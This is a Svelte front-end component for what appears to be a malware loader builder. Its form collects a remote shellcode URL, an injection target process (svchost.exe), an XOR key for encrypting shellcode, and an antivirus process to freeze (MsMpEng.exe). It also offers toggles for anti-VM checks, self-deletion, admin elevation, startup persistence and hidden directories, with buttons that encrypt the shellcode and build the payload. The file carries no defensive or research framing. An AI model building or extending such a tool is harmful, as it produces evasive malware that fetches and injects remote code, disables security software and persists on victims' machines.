<script>
  import { onMount } from 'svelte'
  import { Build, GenerateKey, EncryptFile, CheckDeps, PickFile, PickDir } from '../../wailsjs/go/main/App.js'
  import { logs, status } from '../stores.js'
  import StatusBadge from './StatusBadge.svelte'

  let cfg = {
    shellcode_url: '',
    xor_key: '',
    injection_target: 'C:\\Windows\\System32\\svchost.exe',
    edr_process_name: '',
    freeze_time_ms: 3000,
    enable_anti_vm: false,
    enable_melt: false,
    enable_startup: false,
    enable_admin: false,
    sleep_delay: false,
    hide_directory: false,
    output_path: ''
  }

  let deps = {}

  async function checkDeps() {
    try {
      deps = await CheckDeps()
    } catch (e) {
      console.error(e)
    }
  }

  onMount(() => {
    checkDeps()
  })

  async function genKey() {
    cfg.xor_key = await GenerateKey()
  }

  async function pickOutput() {
    const dir = await PickDir()
    if (dir) {
      cfg.output_path = dir
    }
  }

  async function encryptShellcode() {
    const input = await PickFile('*.bin')
    if (!input) return
    const outPath = input.replace(/\.bin$/, '_xor.bin')
    try {
      await EncryptFile(input, outPath, cfg.xor_key || (await GenerateKey()))
      alert('Encrypted to: ' + outPath)
    } catch (e) {
      alert('Encrypt failed: ' + e)
    }
  }

  async function build() {
    logs.set([])
    status.set('building')
    try {
      await Build(cfg)
      status.set('success')
    } catch (e) {
      logs.update((ls) => [...ls, '[error] ' + e])
      status.set('error')
    }
  }
</script>

<div class="form">
  <div class="row">
    <label>Status</label>
    <StatusBadge status={$status} />
    {#if deps && !deps['g++']}
      <span class="warn">g++ not found on PATH</span>
    {/if}
  </div>

  <label for="sc-url">Shellcode URL</label>
  <input id="sc-url" bind:value={cfg.shellcode_url} placeholder="http://your.server/payload.bin" />

  <label for="inj-target">Injection Target</label>
  <input id="inj-target" bind:value={cfg.injection_target} placeholder="C:\\Windows\\System32\\svchost.exe" />

  <label for="xkey">XOR Key</label>
  <div class="inline">
    <input id="xkey" bind:value={cfg.xor_key} placeholder="auto-generated if blank" />
    <button type="button" on:click={genKey}>Generate</button>
  </div>

  <label for="edr-proc-form">EDR Process Name <small>(optional)</small></label>
  <input id="edr-proc-form" bind:value={cfg.edr_process_name} placeholder="MsMpEng.exe" />

  {#if cfg.edr_process_name}
    <label for="frz-time">Freeze Duration (ms)</label>
    <input id="frz-time" type="number" bind:value={cfg.freeze_time_ms} min="500" max="30000" />
  {/if}

  <label for="out-path-form">Output Directory</label>
  <div class="inline">
    <input id="out-path-form" bind:value={cfg.output_path} readonly placeholder="click browse" />
    <button type="button" on:click={pickOutput}>Browse</button>
  </div>

  <div class="toggles">
    <label><input type="checkbox" bind:checked={cfg.enable_anti_vm} /> Anti-VM</label>
    <label><input type="checkbox" bind:checked={cfg.enable_melt} /> Melt</label>
    <label><input type="checkbox" bind:checked={cfg.enable_admin} /> Admin</label>
    <label><input type="checkbox" bind:checked={cfg.enable_startup} /> Startup</label>
    <label><input type="checkbox" bind:checked={cfg.sleep_delay} /> Sleep Delay</label>
    {#if cfg.enable_startup}
      <label><input type="checkbox" bind:checked={cfg.hide_directory} /> Hide Directory</label>
    {/if}
  </div>

  <div class="actions">
    <button type="button" on:click={encryptShellcode} class="secondary">Encrypt Shellcode</button>
    <button type="button" on:click={build} disabled={$status === 'building'} class="primary">
      {$status === 'building' ? 'Building...' : 'Build'}
    </button>
  </div>
</div>

<style>
  .form {
    display: flex;
    flex-direction: column;
    gap: 0.4rem;
  }
  label {
    color: #aaa;
    font-size: 0.8rem;
    margin-top: 0.4rem;
  }
  input:not([type='checkbox']):not([type='number']) {
    background: #1a1a1a;
    border: 1px solid #444;
    color: #eee;
    padding: 0.35rem 0.5rem;
    width: 100%;
    box-sizing: border-box;
  }
  input[type='number'] {
    background: #1a1a1a;
    border: 1px solid #444;
    color: #eee;
    padding: 0.35rem 0.5rem;
    width: 120px;
  }
  .inline {
    display: flex;
    gap: 0.4rem;
  }
  .inline input {
    flex: 1;
  }
  .toggles {
    display: flex;
    flex-wrap: wrap;
    gap: 0.8rem;
    margin-top: 0.4rem;
  }
  .toggles label {
    display: flex;
    align-items: center;
    gap: 0.3rem;
    color: #ccc;
  }
  .actions {
    display: flex;
    gap: 0.6rem;
    margin-top: 0.8rem;
  }
  button {
    padding: 0.4rem 1rem;
    cursor: pointer;
    border: none;
  }
  .primary {
    background: #e040fb;
    color: #000;
    font-weight: bold;
  }
  .secondary {
    background: #333;
    color: #ccc;
  }
  button:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
  .warn {
    color: #f0b429;
    font-size: 0.75rem;
    margin-left: 0.5rem;
  }
  .row {
    display: flex;
    align-items: center;
    gap: 0.5rem;
  }
</style>
